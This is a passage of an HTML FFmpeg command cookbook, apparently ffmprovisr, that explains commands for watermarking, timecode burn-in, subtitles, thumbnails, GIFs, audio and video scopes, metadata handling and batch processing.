        <dt>-filter_complex overlay=main_w-overlay_w-5:5</dt><dd>This calls the overlay filter and sets x and y coordinates for the position of the watermark on the video. Instead of hardcoding specific x and y coordinates, <code>main_w-overlay_w-5:5</code> uses relative coordinates to place the watermark in the upper right hand corner, based on the width of your input files. Please see the <a href="https://ffmpeg.org/ffmpeg-all.html#toc-Examples-102" target="_blank">FFmpeg documentation for more examples.</a></dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      
    </div>
    <!-- ends Image Watermark -->

    <!-- Burn in timecode-->
    <p><label for="burn_in_timecode">Burn in timecode</label>
    </p><div>
      <h5>Create a burnt in timecode on your image</h5>
      <p><code>ffmpeg -i <em>input_file</em> -vf drawtext="fontfile=<em>font_path</em>:fontsize=<em>font_size</em>:timecode=<em>starting_timecode</em>:fontcolor=<em>font_colour</em>:box=1:boxcolor=<em>box_colour</em>:rate=<em>timecode_rate</em>:x=(w-text_w)/2:y=h/1.2" <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-vf drawtext=</dt><dd>This calls the drawtext filter with the following options:
        </dd><dt>"</dt><dd>quotation mark to start drawtext filter command</dd>
        <dt>fontfile=<em>font_path</em></dt><dd>Set path to font. For example in macOS: <code>fontfile=/Library/Fonts/AppleGothic.ttf</code></dd>
        <dt>fontsize=<em>font_size</em></dt><dd>Set font size. <code>35</code> is a good starting point for SD. Ideally this value is proportional to video size, for example use ffprobe to acquire video height and divide by 14.</dd>
        <dt>timecode=<em>starting_timecode</em></dt><dd>Set the timecode to be displayed for the first frame. Timecode is to be represented as <code>hh:mm:ss[:;.]ff</code>. Colon escaping is determined by O.S, for example in Ubuntu <code>timecode='09\\:50\\:01\\:23'</code>. Ideally, this value would be generated from the file itself using ffprobe.</dd>
        <dt>fontcolor=<em>font_color</em></dt><dd>Set color of font. Can be a text string such as <code>fontcolor=white</code> or a hexadecimal value such as <code>fontcolor=0xFFFFFF</code></dd>
        <dt>box=1</dt><dd>Enable box around timecode</dd>
        <dt>boxcolor=<em>box_color</em></dt><dd>Set color of box. Can be a text string such as <code>fontcolor=black</code> or a hexadecimal value such as <code>fontcolor=0x000000</code></dd>
        <dt>rate=<em>timecode_rate</em></dt><dd>Framerate of video. For example <code>25/1</code></dd>
        <dt>x=(w-text_w)/2:y=h/1.2</dt><dd>Sets <em>x</em> and <em>y</em> coordinates for the timecode. These relative values will horizontally centre your timecode in the bottom third regardless of video dimensions.</dd>
        <dt>"</dt><dd>quotation mark to end drawtext filter command</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file.</dd>
      </dl>
      <p>Note: <code>-vf</code> is a shortcut for <code>-filter:v</code>.</p>
      
    </div>
    <!-- ends Burn in timecode -->

    <!-- Embed subtitles-->
    <p><label for="embed_subtitles">Embed subtitles</label>
    </p><div>
      <h5>Embed a subtitle file into a movie file</h5>
      <p><code>ffmpeg -i <em>input_file</em> -i <em>subtitles_file</em> -c copy -c:s mov_text <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-i <em>subtitles_file</em></dt><dd>path to subtitles file, e.g. <code>subtitles.srt</code></dd>
        <dt>-c copy</dt><dd>enable stream copy (no re-encode)</dd>
        <dt>-c:s mov_text</dt><dd>Encode subtitles using the <code>mov_text</code> codec. Note: The <code>mov_text</code> codec works for MP4 and MOV containers. For the MKV container, acceptable formats are <code>ASS</code>, <code>SRT</code>, and <code>SSA</code>.</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      <p>Note: <code>-c:s</code> is a shortcut for <code>-scodec</code></p>
      
    </div>
    <!-- ends Embed subtitles -->

    </div>
    <div>
    <h2 id="create-images">Create thumbnails or GIFs</h2>

    <!-- One thumbnail -->
    <p><label for="one_thumbnail">Export one thumbnail per video file</label>
    </p><div>
      <h5>One thumbnail</h5>
      <p><code>ffmpeg -i <em>input_file</em> -ss 00:00:20 -vframes 1 thumb.png</code></p>
      <p>This command will grab a thumbnail 20 seconds into the video.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-ss <em>00:00:20</em></dt><dd>seeks video file to 20 seconds into the video</dd>
        <dt>-vframes <em>1</em></dt><dd>sets the number of frames (in this example, one frame)</dd>
        <dt><em>output file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      
    </div>
    <!-- ends One thumbnail -->

    <!-- Multi thumbnail -->
    <p><label for="multi_thumbnail">Export many thumbnails per video file</label>
    </p><div>
      <h5>Many thumbnails</h5>
      <p><code>ffmpeg -i <em>input_file</em> -vf fps=1/60 out%d.png</code></p>
      <p>This will grab a thumbnail every minute and output sequential png files.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-ss <em>00:00:20</em></dt><dd>seeks video file to 20 seconds into the video</dd>
        <dt>-vf fps=1/60</dt><dd>Creates a filtergraph to use for the streams. The rest of the command identifies filtering by frames per second, and sets the frames per second at 1/60 (which is one per minute). Omitting this will output all frames from the video.</dd>
        <dt><em>output file</em></dt><dd>path, name and extension of the output file. In the example out%d.png where %d is a regular expression that adds a number (d is for digit) and increments with each frame (out1.png, out2.png, out3.png…). You may also chose a regular expression like out%04d.png which gives 4 digits with leading 0 (out0001.png, out0002.png, out0003.png, …).</dd>
      </dl>
      
    </div>
    <!-- ends Multi thumbnail -->

    <!-- Images to GIF -->
    <p><label for="img_to_gif">Create GIF from still images</label>
    </p><div>
      <h5>Images to GIF</h5>
      <p><code>ffmpeg -f image2 -framerate 9 -pattern_type glob -i <em>"input_image_*.jpg"</em> -vf scale=250x250 <em>output_file</em>.gif</code></p>
      <p>This will convert a series of image files into a GIF.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-f image2</dt><dd>forces input or output file format. <code>image2</code> specifies the image file demuxer.</dd>
        <dt>-framerate 9</dt><dd>sets framerate to 9 frames per second</dd>
        <dt>-pattern_type glob</dt><dd>tells FFmpeg that the following mapping should "interpret like a <a href="https://en.wikipedia.org/wiki/Glob_%28programming%29" target="_blank">glob</a>" (a "global command" function that relies on the * as a wildcard and finds everything that matches)</dd>
        <dt>-i <em>"input_image_*.jpg"</em></dt><dd>maps all files in the directory that start with input_image_, for example input_image_001.jpg, input_image_002.jpg, input_image_003.jpg... etc.<br>
        (The quotation marks are necessary for the above “glob” pattern!)</dd>
        <dt>-vf scale=250x250</dt><dd>filter the video to scale it to 250x250; <code>-vf</code> is an alias for <code>-filter:v</code></dd>
        <dt><em>output_file.gif</em></dt><dd>path and name of the output file</dd>
      </dl>
      
    </div>
    <!-- ends Images to GIF -->

    <!-- Create GIF -->
    <p><label for="create_gif">Create GIF from a video</label>
    </p><div>
      <h5>Create GIF</h5>
      <p>Create high quality GIF</p>
      <p><code>ffmpeg -ss HH:MM:SS -i <em>input_file</em> -filter_complex "fps=10,scale=500:-1:flags=lanczos,palettegen" -t 3 <em>palette.png</em></code></p>
      <p><code>ffmpeg -ss HH:MM:SS -i <em>input_file</em> -i palette.png -filter_complex "[0:v]fps=10, scale=500:-1:flags=lanczos[v], [v][1:v]paletteuse" -t 3 -loop 6 <em>output_file</em></code></p>
      <p>The first command will use the palettegen filter to create a custom palette, then the second command will create the GIF with the paletteuse filter. The result is a high quality GIF.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-ss <em>HH:MM:SS</em></dt><dd>starting point of the GIF. If a plain numerical value is used it will be interpreted as seconds</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-filter_complex "fps=<em>framerate</em>, scale=<em>width</em>:<em>height</em>, palettegen"</dt><dd>a complex filtergraph.<br>
        Firstly, the fps filter sets the frame rate.<br>
        Then the scale filter resizes the image. You can specify both the width and the height, or specify a value for one and use a scale value of <em>-1</em> for the other to preserve the aspect ratio. (For example, <code>500:-1</code> would create a GIF 500 pixels wide and with a height proportional to the original video). In the first script above, <code>:flags=lanczos</code> specifies that the Lanczos rescaling algorithm will be used to resize the image.<br>
        Lastly, the palettegen filter generates the palette.</dd>
        <dt>-t <em>3</em></dt><dd>duration in seconds (here 3; can be specified also with a full timestamp, i.e. here 00:00:03)</dd>
        <dt>-loop <em>6</em></dt><dd>sets the number of times to loop the GIF. A value of <em>-1</em> will disable looping. Omitting <em>-loop</em> will use the default, which will loop infinitely.</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      <p>The second command has a slightly different filtergraph, which breaks down as follows:</p>
      <dl>
        <dt>-filter_complex "[0:v]fps=10, scale=500:-1:flags=lanczos[v], [v][1:v]paletteuse"</dt><dd><code>[0:v]fps=10,scale=500:-1:flags=lanczos[v]</code>: applies the fps and scale filters described above to the first input file (the video).<br>
        <code>[v][1:v]paletteuse"</code>: applies the <code>paletteuse</code> filter, setting the second input file (the palette) as the reference file.</dd>
      </dl>
      <p>Simpler GIF creation</p>
      <p><code>ffmpeg -ss HH:MM:SS -i <em>input_file</em> -vf "fps=10,scale=500:-1" -t 3 -loop 6 <em>output_file</em></code></p>
      <p>This is a quick and easy method. Dithering is more apparent than the above method using the palette filters, but the file size will be smaller. Perfect for that “legacy” GIF look.</p>
      
    </div>
    <!-- ends Create GIF -->

    </div>
    <div>
    <h2 id="create-video">Create a video from images</h2>

    <!-- Images to video -->
    <p><label for="images_2_video">Transcode an image sequence into uncompressed 10-bit video</label>
    </p><div>
      <h5>Transcode an image sequence into uncompressed 10-bit video</h5>
      <p><code>ffmpeg -f image2 -framerate 24 -i <em>input_file_%06d.ext</em> -c:v v210 <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-f image2</dt><dd>forces the image file de-muxer for single image files</dd>
        <dt>-framerate 24</dt><dd>Sets the input framerate to 24 fps. The image2 demuxer defaults to 25 fps.</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file<br>
        This must match the naming convention actually used! The regex %06d matches six digits long numbers, possibly with leading zeroes. This allows to read in ascending order, one image after the other, the full sequence inside one folder. For image sequences starting with 086400 (i.e. captured with a timecode starting at 01:00:00:00 and at 24 fps), add the flag <code>-start_number 086400</code> before <code>-i input_file_%06d.ext</code>. The extension for TIFF files is .tif or maybe .tiff; the extension for DPX files is .dpx (or eventually .cin for old files).</dd>
        <dt>-c:v v210</dt><dd>encodes an uncompressed 10-bit video stream</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      
    </div>
    <!-- ends Images to video -->

    <!-- Create video from image and audio -->
    <p><label for="image-audio">Create video from image and audio</label>
    </p><div>
      <h5>Create a video from an image and audio file.</h5>
      <p><code>ffmpeg -r 1 -loop 1 -i <em>image_file</em> -i <em>audio_file</em> -acodec copy -shortest -vf scale=1280:720 <em>output_file</em></code></p>
      <p>This command will take an image file (e.g. image.jpg) and an audio file (e.g. audio.mp3) and combine them into a video file that contains the audio track with the image used as the video. It can be useful in a situation where you might want to upload an audio file to a platform like YouTube. You may want to adjust the scaling with -vf to suit your needs.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-r <em>1</em></dt><dd>set the framerate</dd>
        <dt>-loop <em>1</em></dt><dd>loop the first input stream</dd>
        <dt>-i <em>image_file</em></dt><dd>path, name and extension of the image file</dd>
        <dt>-i <em>audio_file</em></dt><dd>path, name and extension of the audio file</dd>
        <dt>-acodec copy</dt><dd>copy the audio. -acodec is an alias for -c:a</dd>
        <dt>-shortest</dt><dd>finish encoding when the shortest input stream ends</dd>
        <dt>-vf scale=1280:720</dt><dd>filter the video to scale it to 1280x720 for YouTube. -vf is an alias for -filter:v</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the video output file</dd>
      </dl>
      
    </div>
    <!-- ends Create video from image and audio -->

    </div>
    <div>
    <h2 id="filters-scopes">Use filters or scopes</h2>

    <!-- abitscope -->
    <p><label for="abitscope">Audio Bitscope</label>
    </p><div>
      <h5>Creates a visualization of the bits in an audio stream</h5>
      <p><code>ffplay -f lavfi "amovie=<em>input_file</em>, asplit=2[out1][a], [a]abitscope=colors=purple|yellow[out0]"</code></p>
      <p>This filter allows visual analysis of the information held in various bit depths of an audio stream. This can aid with identifying when a file that is nominally of a higher bit depth actually has been 'padded' with null information. The provided GIF shows a 16 bit WAV file (left) and then the results of converting that same WAV to 32 bit (right). Note that in the 32 bit version, there is still only information in the first 16 bits.</p>
      <dl>
        <dt>ffplay -f lavfi</dt><dd>starts the command and tells ffplay that you will be using the lavfi virtual device to create the input</dd>
        <dt>"</dt><dd>quotation mark to start the lavfi filtergraph</dd>
        <dt>amovie=<em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>asplit=2[out1][a]</dt><dd>splits the audio stream in two. One of these [a] will be passed to the filter, and the other [out1] will be the audible stream.</dd>
        <dt>[a]abitscope=colors=purple|yellow[out0]</dt><dd>sends stream [a] into the abitscope filter, sets the colors for the channels to purple and yellow, and outputs the results to [out0]. This is what will be the visualization.</dd>
        <dt>"</dt><dd>quotation mark to end the lavfi filtergraph</dd>
      </dl>
      <div>
        <h2>Comparison of mono 16 bit and mono 16 bit padded to 32 bit.</h2>
        <p><img src="https://amiaopensource.github.io/ffmprovisr/img/16_32_abitscope.gif" alt="bit_scope_comparison">
      </p></div>
      
    </div>
    <!-- ends abitscope -->

    <!-- astats -->
    <p><label for="astats">Play a graphical output showing decibel levels of an input file</label>
    </p><div>
      <h5>Plays a graphical output showing decibel levels of an input file</h5>
      <p><code>ffplay -f lavfi "amovie='input.mp3', astats=metadata=1:reset=1, adrawgraph=lavfi.astats.Overall.Peak_level:max=0:min=-30.0:size=700x256:bg=Black[out]"</code></p>
      <dl>
        <dt>ffplay</dt><dd>starts the command</dd>
        <dt>-f lavfi</dt><dd>tells ffplay to use the <a href="https://ffmpeg.org/ffmpeg-devices.html#lavfi" target="_blank">Libavfilter input virtual device</a></dd>
        <dt>"</dt><dd>quotation mark to start the lavfi filtergraph</dd>
        <dt>movie='<em>input.mp3</em>'</dt><dd>declares audio source file on which to apply filter</dd>
        <dt>,</dt><dd>comma signifies the end of audio source section and the beginning of the filter section</dd>
        <dt>astats=metadata=1</dt><dd>tells the astats filter to ouput metadata that can be passed to another filter (in this case adrawgraph)</dd>
        <dt>:</dt><dd>divides between options of the same filter</dd>
        <dt>reset=1</dt><dd>tells the filter to calculate the stats on every frame (increasing this number would calculate stats for groups of frames)</dd>
        <dt>,</dt><dd>comma divides one filter in the chain from another</dd>
        <dt>adrawgraph=lavfi.astats.Overall.Peak_level:max=0:min=-30.0</dt><dd>draws a graph using the overall peak volume calculated by the astats filter. It sets the max for the graph to 0 (dB) and the minimum to -30 (dB). For more options on data points that can be graphed see the <a href="https://ffmpeg.org/ffmpeg-filters.html#astats-1" target="_blank">FFmpeg astats documentation</a></dd>
        <dt>size=700x256:bg=Black</dt><dd>sets the background color and size of the output</dd>
        <dt>[out]</dt><dd>ends the filterchain and sets the output</dd>
        <dt>"</dt><dd>quotation mark to end the lavfi filtergraph</dd>
      </dl>
      <div>
        <h2>Example of filter output</h2>
        <p><img src="https://amiaopensource.github.io/ffmprovisr/img/astats_levels.gif" alt="astats example">
      </p></div>
      
    </div>
    <!-- ends astats -->

    <!-- BRNG -->
    <p><label for="brng">Identify pixels out of broadcast range</label>
    </p><div>
      <h5>Shows all pixels outside of broadcast range</h5>
      <p><code>ffplay -f lavfi "movie='<em>input.mp4</em>', signalstats=out=brng:color=cyan[out]"</code></p>
      <dl>
        <dt>ffplay</dt><dd>starts the command</dd>
        <dt>-f lavfi</dt><dd>tells ffplay to use the <a href="https://ffmpeg.org/ffmpeg-devices.html#lavfi" target="_blank">Libavfilter input virtual device</a></dd>
        <dt>"</dt><dd>quotation mark to start the lavfi filtergraph</dd>
        <dt>movie='<em>input.mp4</em>'</dt><dd>declares video file source to apply filter</dd>
        <dt>,</dt><dd>comma signifies closing of video source assertion and ready for filter assertion</dd>
        <dt>signalstats=out=brng</dt><dd>tells ffplay to use the signalstats command, output the data, use the brng filter</dd>
        <dt>:</dt><dd>indicates there’s another parameter coming</dd>
        <dt>color=cyan[out]</dt><dd>sets the color of out-of-range pixels to cyan</dd>
        <dt>"</dt><dd>quotation mark to end the lavfi filtergraph</dd>
      </dl>
      <div>
        <h2>Example of filter output</h2>
        <p><img src="https://amiaopensource.github.io/ffmprovisr/img/outside_broadcast_range.gif" alt="BRNG example">
      </p></div>
      
    </div>
    <!-- ends BRNG -->

    <!-- Vectorscope -->
    <p><label for="vectorscope">Vectorscope from video to screen</label>
    </p><div>
      <h5>Plays vectorscope of video</h5>
      <p><code>ffplay <em>input_file</em> -vf "split=2[m][v], [v]vectorscope=b=0.7:m=color3:g=green[v], [m][v]overlay=x=W-w:y=H-h"</code></p>
      <dl>
        <dt>ffplay</dt><dd>starts the command</dd>
        <dt><em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-vf</dt><dd>creates a filtergraph to use for the streams</dd>
        <dt>"</dt><dd>quotation mark to start filtergraph</dd>
        <dt>split=2[m][v]</dt><dd>Splits the input into two identical outputs and names them [m] and [v]</dd>
        <dt>,</dt><dd>comma signifies there is another parameter coming</dd>
        <dt>[v]vectorscope=b=0.7:m=color3:g=green[v]</dt><dd>asserts usage of the vectorscope filter and sets a light background opacity (b, alias for bgopacity), sets a background color style (m, alias for mode), and graticule color (g, alias for graticule)</dd>
        <dt>,</dt><dd>comma signifies there is another parameter coming</dd>
        <dt>[m][v]overlay=x=W-w:y=H-h</dt><dd>declares where the vectorscope will overlay on top of the video image as it plays</dd>
        <dt>"</dt><dd>quotation mark to end filtergraph</dd>
      </dl>
      
    </div>
    <!-- ends Vectorscope -->

    <!--Side by Side Videos/Temporal Difference Filter-->
    <p><label for="tempdif">Side by Side Videos/Temporal Difference Filter</label>
    </p><div>
      <h5>This will play two input videos side by side while also applying the temporal difference filter to them</h5>
      <p><code>ffmpeg -i input01 -i input02 -filter_complex "[0:v:0]tblend=all_mode=difference128[a];[1:v:0]tblend=all_mode=difference128[b];[a][b]hstack[out]" -map [out] -f nut -c:v rawvideo - | ffplay -</code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input01</em> -i <em>input02</em></dt><dd>Designates the files to use for inputs one and two respectively</dd>
        <dt>-filter_complex</dt><dd>Lets FFmpeg know we will be using a complex filter (this must be used for multiple inputs)</dd>
        <dt>"</dt><dd>quotation mark to start filtergraph</dd>
        <dt>[0:v:0]tblend=all_mode=difference128[a]</dt><dd>Applies the tblend filter (with the settings all_mode and difference128) to the first video stream from the first input and assigns the result to the output [a]</dd>
        <dt>[1:v:0]tblend=all_mode=difference128[b]</dt><dd>Applies the tblend filter (with the settings all_mode and difference128) to the first video stream from the second input and assigns the result to the output [b]</dd>
        <dt>[a][b]hstack[out]</dt><dd>Takes the outputs from the previous steps ([a] and [b] and uses the hstack (horizontal stack) filter on them to create the side by side output. This output is then named [out])</dd>
        <dt>"</dt><dd>quotation mark to end filtergraph</dd>
        <dt>-map [out]</dt><dd>Maps the output of the filter chain</dd>
        <dt>-f nut</dt><dd>Sets the format for the output video stream to <a href="https://ffmpeg.org/ffmpeg-formats.html#nut" target="_blank">Nut</a></dd>
        <dt>-c:v rawvideo</dt><dd>Sets the video codec of the output video stream to raw video</dd>
        <dt>-</dt><dd>tells FFmpeg that the output will be piped to a new command (as opposed to a file)</dd>
        <dt>|</dt><dd>Tells the system you will be piping the output of the previous command into a new command</dd>
        <dt>ffplay -</dt><dd>Starts ffplay and tells it to use the pipe from the previous command as its input</dd>
      </dl>
      <div>
        <h2>Example of filter output</h2>
        <p><img src="https://amiaopensource.github.io/ffmprovisr/img/tempdif.gif" alt="astats example">
      </p></div>
      
    </div>
    <!-- ends Side by Side Videos/Temporal Difference Filter -->

    <!-- xstack -->
    <p><label for="xstack">Use xstack to arrange output layout of multiple video sources</label>
    </p><div>
      <h5>This filter enables vertical and horizontal stacking of multiple video sources into one output.</h5>
      <p>This filter is useful for the creation of output windows such as the one utilized in <a href="https://github.com/amiaopensource/vrecord" target="_blank">vrecord.</a></p>
      <p><code>ffplay -f lavfi -i <em>testsrc</em> -vf "split=3[a][b][c],[a][b][c]xstack=inputs=3:layout=0_0|0_h0|0_h0+h1[out]"</code></p>
      <p>The following example uses the 'testsrc' virtual input combined with the <a href="https://ffmpeg.org/ffmpeg-filters.html#split_002c-asplit" target="_blank">split filter</a> to generate the multiple inputs.</p>
      <dl>
        <dt>ffplay</dt><dd>starts the command</dd>
        <dt>-f lavfi -i testsrc</dt><dd>tells ffplay to use the <a href="https://ffmpeg.org/ffmpeg-devices.html#lavfi" target="_blank">Libavfilter's virtual device input 'testsrc'</a></dd>
        <dt>-vf</dt><dd>tells ffmpeg that you will be applying a filter chain to the input</dd>
        <dt>split=3[a][b][c],</dt><dd>splits the input into three separate signals within the filter graph, named a, b and c respectively. (These are variables and any names could be used as long as they are kept consistent in following steps). The <code>,</code> separates this from the next part of the filter chain.</dd>
        <dt>[a][b][c]xstack=inputs=3:</dt><dd>tells ffmpeg that you will be using the xstack filter on the three named inputs a,b and c. The final <code>:</code> is a necessary divider between the number of inputs, and the orientation of outputs portion of the xstack command.</dd>
        <dt>layout=0_0|0_h0|0_h0+h1</dt><dd>This is where the locations of the video sources in the output stack are designated. The locations are specified in order of input (so in this example <code>0_0</code> corresponds to input <code>[a]</code>. Inputs must be separated with a <code>|</code>. The two numbers represent columns and rows, with counting starting at zero rather than one. In this example, <code>0_0</code> means that input <code>[a]</code> is placed at the first row of the first column in the output. <code>0_h0</code> places the next input in the first column, at a row corresponding with the height of the first input. <code>0_h0+h1</code> places the final input in the first column, at a row corresponding with the height of the first input plus the height of the second input. This has the effect of creating a vertical stack of the three inputs. This could be made a horizontal stack by changing this portion of the command to <code>layout=0_0|w0_0|w0+w1_0</code>.</dd>
        <dt>[out]</dt><dd>this ends the filter chain and designates the final output.</dd>
      </dl>
      
      
    </div>
    <!-- ends xstack -->

    </div>
    <div>
    

    <!-- Pull specs -->
    <p><label for="pull_specs">Pull specs from video file</label>
    </p><div>
      <h5>Pull specs from video file</h5>
      <p><code>ffprobe -i <em>input_file</em> -show_format -show_streams -show_data -print_format xml</code></p>
      <p>This command extracts technical metadata from a video file and displays it in xml.</p>
      <dl>
        <dt>ffprobe</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-show_format</dt><dd>outputs file container informations</dd>
        <dt>-show_streams</dt><dd>outputs audio and video codec informations</dd>
        <dt>-show_data</dt><dd>adds a short “hexdump” to show_streams command output</dd>
        <dt>-print_format</dt><dd>Set the output printing format (in this example “xml”; other formats include “json” and “flat”)</dd>
      </dl>
      <p>See also the <a href="https://ffmpeg.org/ffprobe.html" target="_blank"> FFmpeg documentation on ffprobe</a> for a full list of flags, commands, and options.</p>
      
    </div>
    <!-- ends Pull specs -->

    <!-- Strip metadata -->
    <p><label for="strip_metadata">Strip metadata</label>
    </p><div>
      <h5>Strips metadata from video file</h5>
      <p><code>ffmpeg -i <em>input_file</em> -map_metadata -1 -c:v copy -c:a copy <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-map_metadata -1</dt><dd>sets metadata copying to -1, which copies nothing</dd>
        <dt>-c:v copy</dt><dd>copies video track</dd>
        <dt>-c:a copy</dt><dd>copies audio track</dd>
        <dt><em>output_file</em></dt><dd>Makes copy of original file and names output file</dd>
      </dl>
      <p>Note: <code>-c:v</code> and <code>-c:a</code> are shortcuts for <code>-vcodec</code> and <code>-acodec</code>.</p>
      
    </div>
    <!-- ends Strip metadata -->

    </div>
    <div>
    <h2 id="preservation">Preservation tasks</h2>

    <!-- batch processing (Mac/Linux) -->
    <p><label for="batch_processing_bash">Batch processing (Mac/Linux)</label>
    </p><div>
      <h5>Create Bash script to batch process with FFmpeg</h5>
      <p>Bash scripts are plain text files saved with a .sh extension. This entry explains how they work with the example of a bash script named “Rewrap-MXF.sh”, which rewraps .mxf files in a given directory to .mov files.</p>
      <p>“Rewrap-MXF.sh” contains the following text:</p>
      <p><code>for file in *.mxf; do ffmpeg -i "$file" -map 0 -c copy "${file%.mxf}.mov"; done</code></p>
      <dl>
        <dt>for file in *.mxf</dt><dd>starts the loop, and states what the input files will be. Here, the FFmpeg command within the loop will be applied to all files with an extension of .mxf.<br>
        The word ‘file’ is an arbitrary variable which will represent each .mxf file in turn as it is looped over.</dd>
        <dt>do ffmpeg -i "$file"</dt><dd>carry out the following FFmpeg command for each input file.<br>
        Per Bash syntax, within the command the variable is referred to by <strong>“$file”</strong>. The dollar sign is used to reference the variable ‘file’, and the enclosing quotation marks prevents reinterpretation of any special characters that may occur within the filename, ensuring that the original filename is retained.</dd>
        <dt>-map 0</dt><dd>retain all streams</dd>
        <dt>-c copy</dt><dd>enable stream copy (no re-encode)</dd>
        <dt>"${file%.mxf}.mov";</dt><dd>retaining the original file name, set the output file wrapper as .mov</dd>
        <dt>done</dt><dd>complete; all items have been processed.</dd>
      </dl>
      <p><strong>Note:</strong> the shell script (.sh file) and all .mxf files to be processed must be contained within the same directory, and the script must be run from that directory.<br>
        Execute the .sh file with the command <code>sh Rewrap-MXF.sh</code>.</p>
      <p>Modify the script as needed to perform different transcodes, or to use with ffprobe. :)</p>
      <p>The basic pattern will look similar to this:<br>
      <code>for item in *.ext; do ffmpeg -i $item <em>(FFmpeg options here)</em> "${item%.ext}_suffix.ext"</code></p>
      <p>e.g., if an input file is bestmovie002.avi, its output will be bestmovie002_suffix.avi.</p>
      <p>Variation: recursively process all MXF files in subdirectories using <code>find</code> instead of <code>for</code>:</p>
      <p><code>find input_directory -iname "*.mxf" -exec ffmpeg -i {} -map 0 -c copy {}.mov \;</code></p>
      
    </div>
    <!-- ends batch processing (Mac/Linux) -->

    <!-- batch processing (Windows) -->
    <p><label for="batch_processing_win">Batch processing (Windows)</label>
    </p><div>
      <h5>Create PowerShell script to batch process with FFmpeg</h5>
      <p>As of Windows 10, it is possible to run Bash via <a href="https://msdn.microsoft.com/en-us/commandline/wsl/about" target="_blank">Bash on Ubuntu on Windows</a>, allowing you to use <a href="#batch_processing_bash">bash scripting</a>. To enable Bash on Windows, see <a href="https://msdn.microsoft.com/en-us/commandline/wsl/install_guide" target="_blank">these instructions</a>.</p>
      <p>On Windows, the primary native command line program is <strong>PowerShell</strong>. PowerShell scripts are plain text files saved with a .ps1 extension. This entry explains how they work with the example of a PowerShell script named “rewrap-mp4.ps1”, which rewraps .mp4 files in a given directory to .mkv files.</p>
      <p>“rewrap-mp4.ps1” contains the following text:</p>
      <pre><code>$inputfiles = ls *.mp4
  foreach ($file in $inputfiles) {
  $output = [io.path]::ChangeExtension($file, '.mkv')
  ffmpeg -i $file -map 0 -c copy $output
  }</code></pre>
      <dl>
        <dt>$inputfiles = ls *.mp4</dt><dd>Creates the variable <code>$inputfiles</code>, which is a list of all the .mp4 files in the current folder.<br>
        In PowerShell, all variable names start with the dollar-sign character.</dd>
        <dt>foreach ($file in $inputfiles)</dt><dd>Creates a loop and states the subsequent code block will be applied to each file listed in <code>$inputfiles</code>.<br>
        <code>$file</code> is an arbitrary variable which will represent each .mp4 file in turn as it is looped over.</dd>
        <dt>{</dt><dd>Opens the code block.</dd>
        <dt>$output = [io.path]::ChangeExtension($file, '.mkv')</dt><dd>Sets up the output file: it will be located in the current folder and keep the same filename, but will have an .mkv extension instead of .mp4.</dd>
        <dt>ffmpeg -i $file</dt><dd>Carry out the following FFmpeg command for each input file.<br>
        <strong>Note:</strong> To call FFmpeg here as just ‘ffmpeg’ (rather than entering the full path to ffmpeg.exe), you must make sure that it’s correctly configured. See <a href="http://adaptivesamples.com/how-to-install-ffmpeg-on-windows/" target="_blank">this article</a>, especially the section ‘Add to Path’.</dd>
        <dt>-map 0</dt><dd>retain all streams</dd>
        <dt>-c copy</dt><dd>enable stream copy (no re-encode)</dd>
        <dt>$output</dt><dd>The output file is set to the value of the <code>$output</code> variable declared above: i.e., the current file name with an .mkv extension.</dd>
        <dt>}</dt><dd>Closes the code block.</dd>
      </dl>
      <p><strong>Note:</strong> the PowerShell script (.ps1 file) and all .mp4 files to be rewrapped must be contained within the same directory, and the script must be run from that directory.</p>
      <p>Execute the .ps1 file by typing <code>.\rewrap-mp4.ps1</code> in PowerShell.</p>
      <p>Modify the script as needed to perform different transcodes, or to use with ffprobe. :)</p>
      
    </div>
    <!-- ends batch processing (Windows) -->

    <!-- Check decoder errors -->
    <p><label for="check_decoder_errors">Check decoder errors</label>
    </p><div>
      <h5>Check decoder errors</h5>
      <p><code>ffmpeg -i <em>input_file</em> -f null -</code></p>
      <p>This decodes your video and prints any errors or found issues to the screen.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-f null</dt><dd>Video is decoded with the <code>null</code> muxer. This allows video decoding without creating an output file.</dd>
        <dt>-</dt><dd>FFmpeg syntax requires a specified output, and <code>-</code> is just a place holder. No file is actually created.</dd>
      </dl>
      
    </div>
    <!-- ends Check decoder errors -->

    <!-- Check FFV1 fixity -->
    <p><label for="check_FFV1_fixity">Check FFV1 fixity</label>
    </p><div>
